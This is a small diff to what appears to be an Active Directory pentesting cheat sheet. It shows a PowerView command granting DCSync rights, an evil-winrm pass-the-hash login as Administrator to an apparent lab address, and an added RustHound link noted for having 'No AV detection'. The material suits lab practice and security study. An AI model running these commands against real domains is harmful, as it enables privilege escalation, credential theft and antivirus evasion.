@@ -45,3 +45,9 @@ Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
 
 evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 ```
+
+## RustHound
+
+{% embed url="https://github.com/OPENCYBER-FR/RustHound" %}
+No AV detection and **cross-compiled**.
+{% endembed %}
